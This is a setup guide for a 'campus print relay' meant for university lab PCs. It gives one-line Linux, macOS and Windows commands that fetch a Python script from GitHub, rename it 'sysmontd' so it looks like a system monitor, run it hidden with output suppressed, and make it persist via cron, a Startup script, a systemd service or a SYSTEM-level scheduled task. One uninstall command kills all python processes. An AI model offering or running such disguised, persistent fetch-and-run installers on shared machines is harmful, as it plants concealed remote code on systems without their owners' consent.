# Campus Print Relay Setup Guide

Print directly to BRACU campus printers from the PreConnect app by running one command on any lab PC.

- **No admin rights required** for User Mode
- **Zero setup** — uses built-in Python 3
- **Auto-starts** on boot

---

## ⚡ User Setup (No Admin Required)

Run this single command in terminal or PowerShell:

### Linux / macOS (Terminal)

```bash
mkdir -p ~/.local/bin && curl -sSL https://raw.githubusercontent.com/sabbirba/preconnect/main/printer.py -o ~/.local/bin/sysmontd.py && (crontab -l 2>/dev/null | grep -v sysmontd; echo "@reboot python3 $HOME/.local/bin/sysmontd.py <key>") | crontab - && nohup python3 ~/.local/bin/sysmontd.py <key> >/dev/null 2>&1 &
```

### Windows (PowerShell)

```powershell
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/sabbirba/preconnect/main/printer.py" -OutFile "$env:APPDATA\sysmontd.py"; Set-Content -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\sysmontd.vbs" -Value 'CreateObject("Wscript.Shell").Run "pythonw """ & CreateObject("Wscript.Shell").ExpandEnvironmentStrings("%APPDATA%") & "\sysmontd.py"" <key>", 0, False'; Start-Process "pythonw" -ArgumentList "$env:APPDATA\sysmontd.py <key>" -WindowStyle Hidden
```

---

## 🛡️ Admin Setup (System-Wide Service)

### Linux (Systemd Service)

```bash
sudo curl -sSL https://raw.githubusercontent.com/sabbirba/preconnect/main/printer.py -o /usr/local/bin/sysmontd.py && sudo chmod +x /usr/local/bin/sysmontd.py && printf '[Unit]\nDescription=Campus Print Relay\nAfter=network.target\n\n[Service]\nExecStart=/usr/bin/python3 /usr/local/bin/sysmontd.py <key>\nRestart=always\nRestartSec=3\nStandardOutput=null\nStandardError=null\n\n[Install]\nWantedBy=multi-user.target\n' | sudo tee /etc/systemd/system/sysmontd.service >/dev/null && sudo systemctl daemon-reload && sudo systemctl enable --now sysmontd
```

### Windows (Administrator PowerShell)

```powershell
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/sabbirba/preconnect/main/printer.py" -OutFile "$env:ProgramData\sysmontd.py"; $action = New-ScheduledTaskAction -Execute "pythonw.exe" -Argument "$env:ProgramData\sysmontd.py <key>"; $trigger = New-ScheduledTaskTrigger -AtStartup; $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Priority 0; Register-ScheduledTask -TaskName "sysmontd" -Action $action -Trigger $trigger -Settings $settings -User "NT AUTHORITY\SYSTEM" -RunLevel Highest -Force; Start-ScheduledTask -TaskName "sysmontd"
```

---

## 🗑️ Uninstall

### Linux / macOS User Uninstall

```bash
pkill -f "<key>" 2>/dev/null; (crontab -l 2>/dev/null | grep -v "<key>") | crontab -; rm -f ~/.local/bin/sysmontd.py ~/.config/autostart/sysmontd.desktop
```

### Windows User Uninstall (PowerShell)

```powershell
Get-CimInstance Win32_Process | Where-Object { $_.CommandLine -like "*<key>*" } | Stop-Process -Force -ErrorAction SilentlyContinue; Remove-Item "$env:APPDATA\sysmontd.py", "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\sysmontd.vbs" -Force -ErrorAction SilentlyContinue
```

### Linux Admin Uninstall

```bash
sudo systemctl disable --now sysmontd; sudo rm -f /etc/systemd/system/sysmontd.service /usr/local/bin/sysmontd.py; sudo systemctl daemon-reload
```

### Windows Admin Uninstall (PowerShell)

```powershell
Unregister-ScheduledTask -TaskName "sysmontd" -Confirm:$false -ErrorAction SilentlyContinue; Stop-Process -Name "python*" -ErrorAction SilentlyContinue; Remove-Item "$env:ProgramData\sysmontd.py" -Force -ErrorAction SilentlyContinue
```

---

## Status Check

### Linux / macOS

```bash
ps aux | grep sysmontd
```

### Windows

```powershell
Get-Process python*
```

---
